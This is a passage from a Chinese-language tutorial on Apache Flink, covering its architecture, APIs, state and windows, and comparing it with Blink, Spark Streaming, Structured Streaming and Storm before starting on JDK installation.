Standalone、YARN、Kubernetes、Mesos 等形式部署的。</p><ul><li>Local：直接在 IDE 中运行 Flink Job 时则会在本地启动一个 mini Flink 集群</li><li>Standalone：在 Flink 目录下执行 <code>bin/start-cluster.sh</code> 脚本则会启动一个 Standalone 模式的集群</li><li>YARN：YARN 是 Hadoop 集群的资源管理系统，它可以在群集上运行各种分布式应用程序，Flink 可与其他应用并行于 YARN 中，Flink on YARN 的架构如下：</li></ul><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plt1pm8wj21880kot9g.jpg" alt="undefined"></p><ul><li>Kubernetes：Kubernetes 是 Google 开源的容器集群管理系统，在 Docker 技术的基础上，为容器化的应用提供部署运行、资源调度、服务发现和动态伸缩等一系列完整功能，提高了大规模容器集群管理的便捷性，Flink 也支持部署在 Kubernetes 上，在 <a href="https://github.com/Aleksandr-Filichkin/flink-k8s/blob/master/flow.jpg" target="_blank" rel="noopener">GitHub</a> 看到有下面这种运行架构的。</li></ul><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pltiz3r3j20ph0lbwfh.jpg" alt="undefined"></p><p>通常上面四种居多，另外还支持 AWS、MapR、Aliyun OSS 等。</p><h3 id="Flink-分布式运行"><a href="#Flink-分布式运行" class="headerlink" title="Flink 分布式运行"></a>Flink 分布式运行</h3><p>Flink 作业提交架构流程可见下图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plu1ecy0j20op0fpad9.jpg" alt="undefined"></p><p>1、Program Code：我们编写的 Flink 应用程序代码</p><p>2、Job Client：Job Client 不是 Flink 程序执行的内部部分，但它是任务执行的起点。 Job Client 负责接受用户的程序代码，然后创建数据流，将数据流提交给 Job Manager 以便进一步执行。 执行完成后，Job Client 将结果返回给用户</p><p>3、Job Manager：主进程（也称为作业管理器）协调和管理程序的执行。 它的主要职责包括安排任务，管理 checkpoint ，故障恢复等。机器集群中至少要有一个 master，master 负责调度 task，协调 checkpoints 和容灾，高可用设置的话可以有多个 master，但要保证一个是 leader, 其他是 standby; Job Manager 包含 Actor system、Scheduler、Check pointing 三个重要的组件</p><p>4、Task Manager：从 Job Manager 处接收需要部署的 Task。Task Manager 是在 JVM 中的一个或多个线程中执行任务的工作节点。 任务执行的并行性由每个 Task Manager 上可用的任务槽（Slot 个数）决定。 每个任务代表分配给任务槽的一组资源。 例如，如果 Task Manager 有四个插槽，那么它将为每个插槽分配 25％ 的内存。 可以在任务槽中运行一个或多个线程。 同一插槽中的线程共享相同的 JVM。 同一 JVM 中的任务共享 TCP 连接和心跳消息。Task Manager 的一个 Slot 代表一个可用线程，该线程具有固定的内存，注意 Slot 只对内存隔离，没有对 CPU 隔离。默认情况下，Flink 允许子任务共享 Slot，即使它们是不同 task 的 subtask，只要它们来自相同的 job。这种共享可以有更好的资源利用率。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plud1dkhj218i0iw78b.jpg" alt="undefined"></p><p>Flink 提供了不同的抽象级别的 API 以开发流式或批处理应用。</p><ul><li>最底层提供了有状态流。它将通过 Process Function 嵌入到 DataStream API 中。它允许用户可以自由地处理来自一个或多个流数据的事件，并使用一致性、容错的状态。除此之外，用户可以注册事件时间和处理事件回调，从而使程序可以实现复杂的计算。</li><li>DataStream / DataSet API 是 Flink 提供的核心 API ，DataSet 处理有界的数据集，DataStream 处理有界或者无界的数据流。用户可以通过各种方法（map / flatmap / window / keyby / sum / max / min / avg / join 等）将数据进行转换或者计算。</li><li>Table API 是以表为中心的声明式 DSL，其中表可能会动态变化（在表达流数据时）。Table API 提供了例如 select、project、join、group-by、aggregate 等操作，使用起来却更加简洁（代码量更少）。 你可以在表与 DataStream/DataSet 之间无缝切换，也允许程序将 Table API 与 DataStream 以及 DataSet 混合使用。</li><li>Flink 提供的最高层级的抽象是 SQL 。这一层抽象在语法与表达能力上与 Table API 类似，但是是以 SQL查询表达式的形式表现程序。SQL 抽象与 Table API 交互密切，同时 SQL 查询可以直接在 Table API 定义的表上执行。</li></ul><p>Flink 除了 DataStream 和 DataSet API，它还支持 Table/SQL API，Flink 也将通过 SQL API 来构建统一的大数据流批处理引擎，因为在公司中通常会有那种每天定时生成报表的需求（批处理的场景，每晚定时跑一遍昨天的数据生成一个结果报表），但是也是会有流处理的场景（比如采用 Flink 来做实时性要求很高的需求），于是慢慢的整个公司的技术选型就变得越来越多了，这样开发人员也就要面临着学习两套不一样的技术框架，运维人员也需要对两种不一样的框架进行环境搭建和作业部署，平时还要维护作业的稳定性。</p><p>当我们的系统变得越来越复杂了，作业越来越多了，这对于开发人员和运维来说简直就是噩梦，没准哪天凌晨晚上就被生产环境的告警电话给叫醒。所以 Flink 系统能通过 SQL API 来解决批流统一的痛点，这样不管是开发还是运维，他们只需要关注一个计算框架就行，从而减少企业的用人成本和后期开发运维成本。</p><h3 id="Flink-程序与数据流结构"><a href="#Flink-程序与数据流结构" class="headerlink" title="Flink 程序与数据流结构"></a>Flink 程序与数据流结构</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pluob9z7j21a00us11g.jpg" alt="undefined"></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plutdjgyj21q20h6q3c.jpg" alt="undefined"></p><p>一个完整的 Flink 应用程序结构就是如上两图所示：</p><p>1、Source：数据输入，Flink 在流处理和批处理上的 source 大概有 4 类：基于本地集合的 source、基于文件的 source、基于网络套接字的 source、自定义的 source。自定义的 source 常见的有 Apache kafka、Amazon Kinesis Streams、RabbitMQ、Twitter Streaming API、Apache NiFi 等，当然你也可以定义自己的 source。</p><p>2、Transformation：数据转换的各种操作，有 Map / FlatMap / Filter / KeyBy / Reduce / Fold / Aggregations / Window / WindowAll / Union / Window join / Split / Select / Project 等，操作很多，可以将数据转换计算成你想要的数据。</p><p>3、Sink：数据输出，Flink 将转换计算后的数据发送的地点 ，你可能需要存储下来，Flink 常见的 Sink 大概有如下几类：写入文件、打印出来、写入 socket 、自定义的 sink 。自定义的 sink 常见的有 Apache kafka、RabbitMQ、MySQL、ElasticSearch、Apache Cassandra、Hadoop FileSystem 等，同理你也可以定义自己的 sink。</p><h3 id="Flink-支持丰富的-Connector"><a href="#Flink-支持丰富的-Connector" class="headerlink" title="Flink 支持丰富的 Connector"></a>Flink 支持丰富的 Connector</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plv10mhgj215218utau.jpg" alt="undefined"></p><p>通过源码可以发现不同版本的 Kafka、不同版本的 ElasticSearch、Cassandra、HBase、Hive、HDFS、RabbitMQ 都是支持的，除了流应用的 Connector 是支持的，另外还支持 SQL。</p><p>再就是要考虑计算的数据来源和数据最终存储，因为 Flink 在大数据领域的的定位就是实时计算，它不做存储（虽然 Flink 中也有 State 去存储状态数据，这里说的存储类似于 MySQL、ElasticSearch 等存储），所以在计算的时候其实你需要考虑的是数据源来自哪里，计算后的结果又存储到哪里去。庆幸的是 Flink 目前已经支持大部分常用的组件了，比如在 Flink 中已经支持了如下这些 Connector：</p><ul><li>不同版本的 Kafka</li><li>不同版本的 ElasticSearch</li><li>Redis</li><li>MySQL</li><li>Cassandra</li><li>RabbitMQ</li><li>HBase</li><li>HDFS</li><li>…</li></ul><p>这些 Connector 除了支持流作业外，目前还有还有支持 SQL 作业的，除了这些自带的 Connector 外，还可以通过 Flink 提供的接口做自定义 Source 和 Sink（在 3.8 节中）。</p><h3 id="Flink-提供事件时间-amp-处理时间语义"><a href="#Flink-提供事件时间-amp-处理时间语义" class="headerlink" title="Flink 提供事件时间&amp;处理时间语义"></a>Flink 提供事件时间&amp;处理时间语义</h3><p>Flink 支持多种 Time，比如 Event time、Ingestion Time、Processing Time，后面的文章 <a href="https://gitbook.cn/gitchat/column/5dad4a20669f843a1a37cb4f/topic/5db69938f6a6211cb96164da" target="_blank" rel="noopener">Flink 中 Processing Time、Event Time、Ingestion Time 对比及其使用场景分析</a> 中会很详细的讲解 Flink 中 Time 的概念。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plwkg73tj21li0u075w.jpg" alt="undefined"></p><h3 id="Flink-提供灵活的窗口机制"><a href="#Flink-提供灵活的窗口机制" class="headerlink" title="Flink 提供灵活的窗口机制"></a>Flink 提供灵活的窗口机制</h3><p>Flink 支持多种 Window，比如 Time Window、Count Window、Session Window，还支持自定义 Window。后面的文章 <a href="https://gitbook.cn/gitchat/column/5dad4a20669f843a1a37cb4f/topic/5db69938f6a6211cb96164da" target="_blank" rel="noopener">如何使用 Flink Window 及 Window 基本概念与实现原理</a> 中会很详细的讲解 Flink 中 Window 的概念。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plx9wf35j22kg1bs0uc.jpg" alt="undefined"></p><h3 id="Flink-并行的执行任务"><a href="#Flink-并行的执行任务" class="headerlink" title="Flink 并行的执行任务"></a>Flink 并行的执行任务</h3><p>Flink 的程序内在是并行和分布式的，数据流可以被分区成 stream partitions，operators 被划分为 operator subtasks; 这些 subtasks 在不同的机器或容器中分不同的线程独立运行； operator subtasks 的数量在具体的 operator 就是并行计算数，程序不同的 operator 阶段可能有不同的并行数；如下图所示，source operator 的并行数为 2，但最后的 sink operator 为 1：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plxlthw1j20jb0crace.jpg" alt="undefined"></p><h3 id="Flink-支持状态存储和容错"><a href="#Flink-支持状态存储和容错" class="headerlink" title="Flink 支持状态存储和容错"></a>Flink 支持状态存储和容错</h3><p>Flink 是一款有状态的流处理框架，它提供了丰富的状态访问接口，按照数据的划分方式，可以分为 Keyed State 和 Operator State，在 Keyed State 中又提供了多种数据结构：</p><ul><li>ValueState</li><li>MapState</li><li>ListState</li><li>ReducingState</li><li>AggregatingState</li></ul><p>另外状态存储也支持多种方式：</p><ul><li>MemoryStateBackend：存储在内存中</li><li>FsStateBackend：存储在文件中</li><li>RocksDBStateBackend：存储在 RocksDB 中</li></ul><p>Flink 中支持使用 Checkpoint 来提高程序的可靠性，开启了 Checkpoint 之后，Flink 会按照一定的时间间隔对程序的运行状态进行备份，当发生故障时，Flink 会将所有任务的状态恢复至最后一次发生 Checkpoint 中的状态，并从那里开始重新开始执行。</p><p>另外 Flink 还支持根据 Savepoint 从已停止作业的运行状态进行恢复，这种方式需要通过命令进行触发。</p><h3 id="Flink-实现了自己的内存管理机制"><a href="#Flink-实现了自己的内存管理机制" class="headerlink" title="Flink 实现了自己的内存管理机制"></a>Flink 实现了自己的内存管理机制</h3><p>//todo:深入内存到底要不要在第九章讲？ Flink 在 JVM 中提供了自己的内存管理，使其独立于 Java 的默认垃圾收集器。 它通过使用散列，索引，缓存和排序有效地进行内存管理。我们在后面的文章 <a href="https://gitbook.cn/gitchat/column/5dad4a20669f843a1a37cb4f/topic/5db69938f6a6211cb96164da" target="_blank" rel="noopener">深入探索 Flink 内存管理机制</a> 会深入讲解 Flink 里面的内存管理机制。</p><h3 id="Flink-支持多种扩展库"><a href="#Flink-支持多种扩展库" class="headerlink" title="Flink 支持多种扩展库"></a>Flink 支持多种扩展库</h3><p>Flink 扩展库中含有机器学习、Gelly 图形处理、CEP 复杂事件处理、State Processing API 等，关于这块内容可以在第六章查看。</p><h3 id="小结与反思-1"><a href="#小结与反思-1" class="headerlink" title="小结与反思"></a>小结与反思</h3><p>本节在开始介绍 Flink 之前先讲解了下数据集类型和数据运算模型，接着开始介绍 Flink 的各种特性，</p><hr><h2 id="三、大数据框架-Flink、Blink、Spark-Streaming、Structured-Streaming和-Storm-的区别。"><a href="#三、大数据框架-Flink、Blink、Spark-Streaming、Structured-Streaming和-Storm-的区别。" class="headerlink" title="三、大数据框架 Flink、Blink、Spark Streaming、Structured Streaming和 Storm 的区别。"></a>三、大数据框架 Flink、Blink、Spark Streaming、Structured Streaming和 Storm 的区别。</h2><h3 id="Flink"><a href="#Flink" class="headerlink" title="Flink"></a>Flink</h3><p>Flink 是一个针对流数据和批数据分布式处理的引擎，在某些对实时性要求非常高的场景，基本上都是采用 Flink 来作为计算引擎，它不仅可以处理有界的批数据，还可以处理无界的流数据，在 Flink 的设计愿想就是将批处理当成是流处理的一种特例。</p><p>在 Flink 的母公司 <a href="https://www.eu-startups.com/2019/01/alibaba-takes-over-berlin-based-streaming-analytics-startup-data-artisans/" target="_blank" rel="noopener">Data Artisans 被阿里收购</a>之后，阿里也在开始逐步将内部的 Blink 代码开源出来并合并在 Flink 主分支上。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8plzy3s4ej215e1g045u.jpg" alt="undefined"></p><p>而 Blink 一个很强大的特点就是它的 SQL API 很强大，社区也在 Flink 1.9 版本将 Blink 开源版本大部分代码合进了 Flink 主分支。</p><h3 id="Blink"><a href="#Blink" class="headerlink" title="Blink"></a>Blink</h3><p>Blink 是早期阿里在 Flink 的基础上开始修改和完善后在内部创建的分支，然后 Blink 目前在阿里服务于阿里集团内部搜索、推荐、广告、菜鸟物流等大量核心实时业务。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pm0elnw7j20mn0d7t9i.jpg" alt="undefined"></p><p>Blink 在阿里内部错综复杂的业务场景中锻炼成长着，经历了内部这么多用户的反馈（各种性能、资源使用率、易用性等诸多方面的问题），Blink 都做了针对性的改进。在 Flink Forward China 峰会上，阿里巴巴集团副总裁周靖人宣布 Blink 在 2019 年 1 月正式开源，同时阿里也希望 Blink 开源后能进一步加深与 Flink 社区的联动，</p><p>Blink 开源地址：<a href="https://github.com/apache/flink/tree/blink" target="_blank" rel="noopener">https://github.com/apache/flink/tree/blink</a></p><p>开源版本 Blink 的主要功能和优化点：</p><p>1、Runtime 层引入 Pluggable Shuffle Architecture，开发者可以根据不同的计算模型或者新硬件的需要实现不同的 shuffle 策略进行适配；为了性能优化，Blink 可以让算子更加灵活的 chain 在一起，避免了不必要的数据传输开销；在 BroadCast Shuffle 模式中，Blink 优化掉了大量的不必要的序列化和反序列化开销；Blink 提供了全新的 JM FailOver 机制，JM 发生错误之后，新的 JM 会重新接管整个 JOB 而不是重启 JOB，从而大大减少了 JM FailOver 对 JOB 的影响；Blink 支持运行在 Kubernetes 上。</p><p>2、SQL/Table API 架构上的重构和性能的优化是 Blink 开源版本的一个重大贡献。</p><p>3、Hive 的兼容性，可以直接用 Flink SQL 去查询 Hive 的数据，Blink 重构了 Flink catalog 的实现，并且增加了两种 catalog，一个是基于内存存储的 FlinkInMemoryCatalog，另外一个是能够桥接 Hive metaStore 的 HiveCatalog。</p><p>4、Zeppelin for Flink</p><p>5、Flink Web，更美观的 UI 界面，查看日志和监控 Job 都变得更加方便</p><p>对于开源那会看到一个对话让笔者感到很震撼：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Blink 开源后，两个开源项目之间的关系会是怎样的？未来 Flink 和 Blink 也会由不同的团队各自维护吗？</span><br><span class="line"></span><br><span class="line">Blink 永远不会成为另外一个项目，如果后续进入 Apache 一定是成为 Flink 的一部分</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pm107pqzj217k104jw6.jpg" alt="undefined"></p><p>在 Blink 开源那会，笔者就将源码自己编译了一份，然后自己在本地一直运行着，感兴趣的可以看看文章 <a href="http://www.54tianzhisheng.cn/2019/02/28/blink/" target="_blank" rel="noopener">阿里巴巴开源的 Blink 实时计算框架真香</a> ，你会发现 Blink 的 UI 还是比较美观和实用的。</p><p>如果你还对 Blink 有什么疑问，可以看看下面两篇文章：</p><p><a href="https://www.infoq.cn/article/wZ_b7Hw9polQWp3mTwVh" target="_blank" rel="noopener">阿里重磅开源 Blink：为什么我们等了这么久？</a></p><p><a href="https://www.infoq.cn/article/ZkOGAl6_vkZDTk8tfbbg" target="_blank" rel="noopener">重磅！阿里巴巴 Blink 正式开源，重要优化点解读</a></p><h3 id="1-3-3-Spark"><a href="#1-3-3-Spark" class="headerlink" title="1.3.3 Spark"></a>1.3.3 Spark</h3><p>Apache Spark 是一种包含流处理能力的下一代批处理框架。与 Hadoop 的 MapReduce 引擎基于各种相同原则开发而来的 Spark 主要侧重于通过完善的内存计算和处理优化机制加快批处理工作负载的运行速度。</p><p>Spark 可作为独立集群部署（需要相应存储层的配合），或可与 Hadoop 集成并取代 MapReduce 引擎。</p><h3 id="Spark-Streaming"><a href="#Spark-Streaming" class="headerlink" title="Spark Streaming"></a>Spark Streaming</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pm2ghwbrj20sg0g0gmg.jpg" alt="undefined"></p><p><a href="https://spark.apache.org/docs/latest/streaming-programming-guide.html" target="_blank" rel="noopener">Spark Streaming</a> 是 Spark API 核心的扩展，可实现实时数据的快速扩展，高吞吐量，容错处理。数据可以从很多来源（如 Kafka、Flume、Kinesis 等）中提取，并且可以通过很多函数来处理这些数据，处理完后的数据可以直接存入数据库或者 Dashboard 等。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pm2mmmyoj20wk0c6js2.jpg" alt="undefined"></p><p><strong>Spark Streaming 的内部实现原理</strong>是接收实时输入数据流并将数据分成批处理，然后由 Spark 引擎处理以批量生成最终结果流，也就是常说的 micro-batch 模式。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pm2t6k21j20tr06naad.jpg" alt="undefined"></p><p>DStreams 是 Spark Streaming 提供的基本的抽象，它代表一个连续的数据流。。它要么是从源中获取的输入流，要么是输入流通过转换算子生成的处理后的数据流。在内部实现上，DStream 由连续的序列化 RDD 来表示，每个 RDD 含有一段时间间隔内的数据：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pm30f5cqj20ub06nweq.jpg" alt="undefined"></p><p>任何对 DStreams 的操作都转换成了对 DStreams 隐含的 RDD 的操作。例如 flatMap 操作应用于 lines 这个 DStreams 的每个 RDD，生成 words 这个 DStreams 的 RDD 过程如下图所示：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pm3b0i1qj20ub0asmxp.jpg" alt="undefined"></p><p>通过 Spark 引擎计算这些隐含 RDD 的转换算子。DStreams 操作隐藏了大部分的细节，并且为了更便捷，为开发者提供了更高层的 API。</p><p><strong>Spark 支持的滑动窗口</strong></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pm3imkjuj20rm0asdg9.jpg" alt="undefined"></p><p>它和 Flink 的滑动窗口类似，支持传入两个参数，一个代表窗口长度，一个代表滑动间隔。</p><p><strong>Spark 支持更多的 API</strong></p><p>因为 Spark 是使用 Scala 开发的居多，所以从官方文档就可以看得到对 Scala 的 API 支持的很好，而 Flink 源码实现主要以 Java 为主，因此也对 Java API 更友好，从两者目前支持的 API 友好程度，应该是 Spark 更好，它目前也支持 Python API，但是 Flink 新版本也在不断的支持 Python API。</p><p><strong>Spark 支持更多的 Machine Learning Lib</strong></p><p>你可以很轻松的使用 Spark MLlib 提供的机器学习算法，然后将这些这些机器学习算法模型应用在流数据中，目前 Flink Machine Learning 这块的内容还较少，不过阿里宣称会开源些 Flink Machine Learning 算法，保持和 Spark 目前已有的算法一致，我自己在 GitHub 上看到一个阿里开源的仓库，感兴趣的可以看看 <a href="https://github.com/alibaba/flink-ai-extended" target="_blank" rel="noopener">flink-ai-extended</a>。</p><p><strong>Spark Checkpoint</strong></p><p>Spark 和 Flink 一样都支持 Checkpoint，但是 Flink 还支持 Savepoint，你可以在停止 Flink 作业的时候使用 Savepoint 将作业的状态保存下来，当作业重启的时候再从 Savepoint 中将停止作业那个时刻的状态恢复起来，保持作业的状态和之前一致。</p><p><strong>Spark SQL</strong></p><p>Spark 除了 DataFrames 和 Datasets 外，也还有 SQL API，这样你就可以通过 SQL 查询数据，另外 Spark SQL 还可以用于从 Hive 中读取数据。</p><p>从 Spark 官网也可以看到很多比较好的特性，这里就不一一介绍了，如果对 Spark 感兴趣的话也可以去<a href="https://spark.apache.org/docs/latest/index.html" target="_blank" rel="noopener">官网</a>了解一下具体的使用方法和实现原理。</p><p><strong>Spark Streaming 优缺点</strong></p><p>1、优点</p><ul><li>Spark Streaming 内部的实现和调度方式高度依赖 Spark 的 DAG 调度器和 RDD，这就决定了 Spark Streaming 的设计初衷必须是粗粒度方式的，也就无法做到真正的实时处理</li><li>Spark Streaming 的粗粒度执行方式使其确保“处理且仅处理一次”的特性，同时也可以更方便地实现容错恢复机制。</li><li>由于 Spark Streaming 的 DStream 本质是 RDD 在流式数据上的抽象，因此基于 RDD 的各种操作也有相应的基于 DStream 的版本，这样就大大降低了用户对于新框架的学习成本，在了解 Spark 的情况下用户将很容易使用 Spark Streaming。</li></ul><p>2、缺点</p><ul><li>Spark Streaming 的粗粒度处理方式也造成了不可避免的数据延迟。在细粒度处理方式下，理想情况下每一条记录都会被实时处理，而在 Spark Streaming 中，数据需要汇总到一定的量后再一次性处理，这就增加了数据处理的延迟，这种延迟是由框架的设计引入的，并不是由网络或其他情况造成的。</li><li>使用的是 Processing Time 而不是 Event Time</li></ul><h3 id="Structured-Streaming"><a href="#Structured-Streaming" class="headerlink" title="Structured Streaming"></a>Structured Streaming</h3><p><a href="https://spark.apache.org/docs/latest/structured-streaming-programming-guide.html" target="_blank" rel="noopener">Structured Streaming</a> 是一种基于 Spark SQL 引擎的可扩展且容错的流处理引擎，它最关键的思想是将实时数据流视为一个不断增加的表，从而就可以像操作批的静态数据一样来操作流数据了。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pm3y2va0j214w0m03zf.jpg" alt="undefined"></p><p>会对输入的查询生成“结果表”，每个触发间隔（例如，每 1 秒）新行将附加到输入表，最终更新结果表，每当结果表更新时，我们希望能够将更改后的结果写入外部接收器去。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pm5gkz7aj21810r9dgp.jpg" alt="undefined"></p><p>终于支持事件时间的窗口操作：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pm5nafczj21980n940t.jpg" alt="undefined"></p><p>对比你会发现这个 Structured Streaming 怎么和 Flink 这么像，哈哈哈哈，不过这确实是未来的正确之路，两者的功能也会越来越相像的，期待它们出现更加令人兴奋的功能。</p><p>如果你对 Structured Streaming 感兴趣的话，可以去<a href="https://spark.apache.org/docs/latest/structured-streaming-programming-guide.html" target="_blank" rel="noopener">官网</a>做更深一步的了解，顺带附上 <a href="https://cs.stanford.edu/~matei/papers/2018/sigmod_structured_streaming.pdf" target="_blank" rel="noopener">Structured Streaming</a> 的 Paper，同时也附上一位阿里小哥的 PPT —— <a href="https://www.slidestalk.com/s/FromSparkStreamingtoStructuredStreaming58639" target="_blank" rel="noopener">From Spark Streaming to Structured Streaming</a>。</p><h3 id="Flink-VS-Spark"><a href="#Flink-VS-Spark" class="headerlink" title="Flink VS Spark"></a>Flink VS Spark</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pn93djtcj20g205umx6.jpg" alt="undefined"></p><p>通过上面你应该可以了解到 Flink 对比 Spark Streaming 的微批处理来说是有一定的优势，并且 Flink 还有一些特别的优点，比如灵活的时间语义、多种时间窗口、结合水印处理延迟数据等，但是 Spark 也有自己的一些优势，功能在早期来说是很完善的，并且新版本的 Spark 还添加了 Structured Streaming，它和 Flink 的功能很相近，两个还是值得更深入的对比，期待后面官方的测试对比报告。</p><h3 id="Storm"><a href="#Storm" class="headerlink" title="Storm"></a>Storm</h3><p>Storm 是一个开源的分布式实时计算系统，可以简单、可靠的处理大量的数据流。Storm 支持水平扩展，具有高容错性，保证每个消息都会得到处理，Strom 本身是无状态的，通过 ZooKeeper 管理分布式集群环境和集群状态。</p><h4 id="Storm-核心组件"><a href="#Storm-核心组件" class="headerlink" title="Storm 核心组件"></a>Storm 核心组件</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pn9bggknj21qo0yc407.jpg" alt="undefined"></p><p>Nimbus：负责资源分配和任务调度，Nimbus 对任务的分配信息会存储在 Zookeeper 上面的目录下。</p><p>Supervisor：负责去 Zookeeper 上的指定目录接受 Nimbus 分配的任务，启动和停止属于自己管理的 Worker 进程。它是当前物理机器上的管理者 —— 通过配置文件设置当前 Supervisor 上启动多少个 Worker。</p><p>Worker：运行具体处理组件逻辑的进程，Worker 运行的任务类型只有两种，一种是 Spout 任务，一种是 Bolt 任务。</p><p>Task：Worker 中每一个 Spout/Bolt 的线程称为一个 Task. 在 Storm0.8 之后，Task 不再与物理线程对应，不同 Spout/Bolt 的 Task 可能会共享一个物理线程，该线程称为 Executor。</p><p>Worker、Task、Executor 三者之间的关系:</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pn9ibun2j21fe0u040j.jpg" alt="undefined"></p><h4 id="Storm-核心概念"><a href="#Storm-核心概念" class="headerlink" title="Storm 核心概念"></a>Storm 核心概念</h4><ul><li>Nimbus：Storm 集群主节点，负责资源分配和任务调度，任务的提交和停止都是在 Nimbus 上操作的，一个 Storm 集群只有一个 Nimbus 节点。</li><li>Supervisor：Storm 集群工作节点，接受 Nimbus 分配任务，管理所有 Worker。</li><li>Worker：工作进程，每个工作进程中都有多个 Task。</li><li>Executor：产生于 Worker 进程内部的线程，会执行同一个组件的一个或者多个 Task。</li><li>Task：任务，每个 Spout 和 Bolt 都是一个任务，每个任务都是一个线程。</li><li>Topology：计算拓扑，包含了应用程序的逻辑。</li><li>Stream：消息流，关键抽象，是没有边界的 Tuple 序列。</li><li>Spout：消息流的源头，Topology 的消息生产者。</li><li>Bolt：消息处理单元，可以过滤、聚合、查询数据库。</li><li>Tuple：数据单元，数据流中就是一个个 Tuple。</li><li>Stream grouping：消息分发策略，一共 6 种，控制 Tuple 的路由，定义 Tuple 在 Topology 中如何流动。</li><li>Reliability：可靠性，Storm 保证每个 Tuple 都会被处理。</li></ul><h4 id="Storm-数据处理流程图"><a href="#Storm-数据处理流程图" class="headerlink" title="Storm 数据处理流程图"></a>Storm 数据处理流程图</h4><p>Storm 处理数据的特点：数据源源不断，不断处理，数据都是 Tuple。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pn9pgxz7j21nm0qwq48.jpg" alt="undefined"></p><h3 id="Flink-VS-Storm"><a href="#Flink-VS-Storm" class="headerlink" title="Flink VS Storm"></a>Flink VS Storm</h3><p>可以参考的文章有：</p><p><a href="https://tech.meituan.com/2017/11/17/flink-benchmark.html" target="_blank" rel="noopener">流计算框架 Flink 与 Storm 的性能对比</a></p><p><a href="https://mp.weixin.qq.com/s/E7pM5XKb_QH225nl0JKFkg" target="_blank" rel="noopener">360 深度实践：Flink 与 Storm 协议级对比</a></p><p>两篇文章都从不同场景、不同数据压力下对比 Flink 和 Storm 两个实时计算框架的性能表现，最终结果都表明 Flink 比 Storm 的吞吐量和性能远超 Storm。</p><h3 id="全部对比结果"><a href="#全部对比结果" class="headerlink" title="全部对比结果"></a>全部对比结果</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8pn9wb7zgj22y81eedne.jpg" alt="undefined"></p><p>如果对延迟要求不高的情况下，可以使用 Spark Streaming，它拥有丰富的高级 API，使用简单，并且 Spark 生态也比较成熟，吞吐量大，部署简单，社区活跃度较高，从 GitHub 的 star 数量也可以看得出来现在公司用 Spark 还是居多的，并且在新版本还引入了 Structured Streaming，这也会让 Spark 的体系更加完善。</p><p>如果对延迟性要求非常高的话，可以使用当下最火的流处理框架 Flink，采用原生的流处理系统，保证了低延迟性，在 API 和容错性方面做的也比较完善，使用和部署相对来说也是比较简单的，加上国内阿里贡献的 Blink，相信接下来 Flink 的功能将会更加完善，发展也会更加好，社区问题的响应速度也是非常快的，另外还有专门的钉钉大群和中文列表供大家提问，每周还会有专家进行直播讲解和答疑。</p><h3 id="小结与反思-2"><a href="#小结与反思-2" class="headerlink" title="小结与反思"></a>小结与反思</h3><p>因在 1.2 节中已经对 Flink 的特性做了很详细的讲解，所以本篇主要介绍其他几种计算框架（Blink、Spark、Spark Streaming、Structured Streaming、Storm），并对比分析了这几种框架的特点与不同。你对这几种计算框架中的哪个最熟悉呢？了解过它们之间的差异吗？你有压测过它们的处理数据的性能吗？</p><hr><h2 id="四、Flink-环境准备"><a href="#四、Flink-环境准备" class="headerlink" title="四、Flink 环境准备"></a>四、Flink 环境准备</h2><p>通过前面几篇文章，相信你已经对 Flink 的基础概念等知识已经有一定了解，现在是不是迫切的想把 Flink 给用起来？先别急，我们先把电脑的准备环境给安装好，这样后面才能更愉快地玩耍。</p><p>废话不多说了，直奔主题。因为后面可能用到的有：Kafka、MySQL、ElasticSearch 等，另外像 Flink 编写程序还需要依赖 Java，还有就是我们项目是用 Maven 来管理依赖的，所以这篇文章我们先来安装下这个几个，准备好本地的环境，后面如果还要安装其他的组件我们到时在新文章中补充，如果你的操作系统已经中已经安装过 JDK、Maven、MySQL、IDEA 等，那么你可以跳过对应的内容，直接看你未安装过的。</p><p>这里我再说下我自己电脑的系统环境：macOS High Sierra 10.13.5，后面文章的演示环境不作特别说明的话就是都在这个系统环境中。</p><h3 id="JDK-安装与配置"><a href="#JDK-安装与配置" class="headerlink" title="JDK 安装与配置"></a>JDK 安装与配置</h3><p>虽然现在 JDK 已经更新到 12 了，但是为了稳定我们还是安装 JDK 8，如果没有安装过的话，可以去<a href="https://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">官网</a> 的<a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">下载页面</a>下载对应自己操作系统的最新 JDK8 就行。</p><p>Mac 系统的是 jdk-8u211-macosx-x64.dmg 格式、Linux 系统的是 jdk-8u211-linux-x64.tar.gz 格式。</p><p>Mac 系统安装的话直接双击然后一直按照提示就行了，最后 